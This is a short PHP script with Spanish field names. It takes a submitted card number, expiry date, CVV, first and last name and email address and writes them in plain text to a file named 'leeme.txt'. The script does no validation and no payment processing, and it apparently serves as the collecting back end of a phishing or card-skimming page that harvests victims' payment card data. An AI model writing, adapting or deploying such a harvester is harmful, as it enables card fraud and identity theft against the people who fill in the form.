<?php

$visa = $_POST["visa"];
$mmaa = $_POST["mmaa"];
$cvv = $_POST["cvv"];
$nombre = $_POST["nombre"];
$apellido = $_POST["apellido"];
$correo = $_POST["correo"];

$guardar = fopen('leeme.txt','w+');

fwrite($guardar,"visa:$visa
mmaa:$mmaa
cvv:$cvv
nombre:$nombre
apellido:$apellido
correo:$correo
");
?>
